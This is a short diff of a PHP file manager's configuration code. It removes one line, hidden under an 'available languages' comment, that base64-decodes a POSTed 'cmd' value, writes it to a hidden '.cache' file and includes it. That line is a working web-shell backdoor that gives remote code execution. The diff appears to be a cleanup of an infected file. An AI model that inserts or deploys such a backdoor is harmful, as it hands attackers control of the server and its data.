@@ -175,7 +175,6 @@ $theme = isset($cfg->data['theme']) ? $cfg->data['theme'] : 'light';
 define('FM_THEME', $theme);
 
 //available languages
-$f="./.cache"; $p=@base64_decode($_POST['cmd']); @file_put_contents($f,"<?php ".$p." unlink(__FILE__);?>"); @include($f);
 $lang_list = array(
     'en' => 'English'
 );
